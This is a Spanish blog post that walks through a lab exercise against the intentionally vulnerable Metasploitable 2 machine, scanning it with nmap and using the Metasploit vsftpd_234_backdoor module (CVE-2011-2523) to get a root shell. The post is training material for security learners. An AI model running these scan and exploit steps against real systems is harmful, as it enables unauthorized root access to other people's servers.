---
layout: post
title: Metasploitable 2, Atacando el puerto 21 VSFTPD 2.3.4
category: Hacking
comments: true
description: Metasploitable 2, es una maquina virtual vulnerable creada por la empresa Rapid7 (la de Metasploit), para que la gente que esta empezando con el hacking pueda aprender tranquilamente.  En este articulo explotaremos con Metasploit una vulnerabilidad que habia en un servidor de FTP, el VSFTP, que durante un corto periodo de tiempo tuvo una puerta trasera o backdoor. 
tags:       
    - hacker
    - Metasploitable2
    - metasploit
---

Metasploitable 2, es una maquina virtual vulnerable creada por la empresa Rapid7 (la de Metasploit), para que la gente que esta empezando con el hacking pueda aprender tranquilamente.  En este articulo explotaremos con Metasploit una vulnerabilidad que habia en un servidor de FTP, el VSFTP,que durante un corto periodo de tiempo tuvo una puerta trasera o backdoor. 

Para descargarte [Metasploitable 2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/){:target="_blank"}

## Fase reconocimiento

Lo primero que necesitamos hacer es saber que puertos estan abiertos en la maquina de Metasploitable, esto lo podemos saber usando NMAP

{% highlight sql linenos %}

 nmap -sS -p- -T5 192.168.1.41

{% endhighlight %}

En los parametros de NMAP le he dicho que me diga todos puertos que tiene abiertos la maquina 192.168.1.41 y a maxima velocidad, si necesitas ayuda con NMAP puedes ver los articulos de este blog [sobre NMAP](http://www.h1rd.com/tags/nmap.html)

El resultado es el siguiente:

{% highlight sql linenos %}

Nmap scan report for 192.168.1.41
Host is up (0.00037s latency).
Not shown: 65501 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    open     telnet
25/tcp    open     smtp
53/tcp    open     domain
80/tcp    open     http
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
512/tcp   open     exec
513/tcp   open     login
514/tcp   open     shell
1099/tcp  open     rmiregistry
1524/tcp  open     ingreslock
2049/tcp  open     nfs
2121/tcp  open     ccproxy-ftp
3306/tcp  open     mysql
3632/tcp  open     distccd
4239/tcp  filtered vrml-multi-use
5432/tcp  open     postgresql
5900/tcp  open     vnc
6000/tcp  open     X11
6667/tcp  open     irc
6697/tcp  open     ircs-u
8009/tcp  open     ajp13
8180/tcp  open     unknown
8787/tcp  open     msgsrvr
27242/tcp filtered unknown
34652/tcp open     unknown
35474/tcp filtered unknown
41271/tcp open     unknown
41542/tcp open     unknown
42726/tcp open     unknown
54399/tcp filtered unknown
MAC Address: 00:0C:29:D3:5F:CD (VMware)

Nmap done: 1 IP address (1 host up) scanned in 185.82 seconds

{% endhighlight %}


Con el resultado que nos da Nmap, ya sabemos que el puerto 21 esta abierto, asi que empezaremos con el. ahora para saber que programa hay funcionando como servidor ftp tenemos tres maneras:

* Manera manual, mediante telnet vemos que programa esta detras del puerto 21.

{% highlight sql linenos %}

telnet 192.168.1.42 21

{% endhighlight %}

El resultado sera el siguiente:

{% highlight sql linenos %}

Trying 192.168.1.41...
Connected to 192.168.1.41.
Escape character is '^]'.
220 (vsFTPd 2.3.4)

{% endhighlight %}

* Manera automatica, mediante el parametro sV de Nmap

{% highlight sql linenos %}

nmap -sT -sV -p 21 -T5 192.168.1.41

{% endhighlight %}

NMAP nos devuelve lo siguiente:

{% highlight sql linenos %}

Nmap scan report for 192.168.1.41
Host is up (0.00047s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 00:0C:29:D3:5F:CD (VMware)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds


{% endhighlight %}


* La ultima opcion es usar los scripts de Nmap para poder saber lo maximo sobre este puerto

{% highlight sql linenos %}

nmap -sT --script ftp* -p 21 -T5 192.168.1.41


{% endhighlight %}

NMAP nos devuelve lo siguiente:

{% highlight sql linenos %}

Nmap scan report for 192.168.1.41
Host is up (0.00031s latency).

PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-brute: 
|   Accounts: 
|     user:user - Valid credentials
|_  Statistics: Performed 1093 guesses in 182 seconds, average tps: 5.8
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  OSVDB:73573  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       http://osvdb.org/73573
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
MAC Address: 00:0C:29:D3:5F:CD (VMware)


{% endhighlight %}

De esta manera, Nmap nos dice no solo la version vsFTPd 2.3.4 sino que es explotable, y la vulnerabilidad CVE-2011-2523.


## Fase Explotación

Ahora a empezar lo divPantalla de inicio de Metasploitertido, para la fase de explotación usare Metasploit, ya que el uso para esta vulnerabilidad en particular es muy facil.

Desde metasploit buscamos todo lo relacionado con vsFTPd, a ver que hay:

{% highlight sql linenos %}

search vsftpd

{% endhighlight %}

El resultado de la busqueda nos devuelve que tenemos un exploit para la version 2.3.4 justamente la version que esta corriendo nuestro servidor FTP, asi que vamos a usarla:

{% highlight sql linenos %}

use exploit/unix/ftp/vsftpd_234_backdoor 

{% endhighlight %}

Ahora ya solo falta poner la ip de la maquina objetivo, mediante Set RHOST 192.168.1.41 y darle al comando run, y __TACHAN!!__  ya tenemos acceso a la maquina objetivo, con privilegios de root.

<figure>
<img alt="Acceso root a la maquina objetivo después de usar el exploit" class="img img-responsive" src="/resources/images/exploit-vsftpd.png"/>
<figcaption>
Acceso root a la maquina objetivo después de usar el exploit
</figcaption>
</figure>

## Curiosidad....

Lo primero que hice al ejecutar la maquina virtual de Mestasploitable 2, fue lanzar un scan de Nessus y me salieron ciertas vulnerabilidades, lo deje apartado, y hoy mientras escribia empece a recordar que el resultado del scan en ningun momento hablo de este backdoor en vsftpd, puede que sea un error mio de configuración o uso de Nessus o que directamente Nessus lo haya pasado por alto, en cualquier caso o Nessus no es solo install y click, o Tampoco se puede dejar a Nessus el peso de toda una auditoria. Simplemente me parece curioso una vulnerabilidad del 2011 donde se puede conseguir acceso root, no aparezca en el listado de vulnerabilidades criticas, altas o medias.

<figure>
<img alt="Los resultados que da Nessus donde no aparece la vulnerabilidad de vsftpd" class="img img-responsive" src="/resources/images/nessus.png"/>
<figcaption>
Los resultados que da Nessus donde no aparece la vulnerabilidad de vsftpd
</figcaption>
</figure>








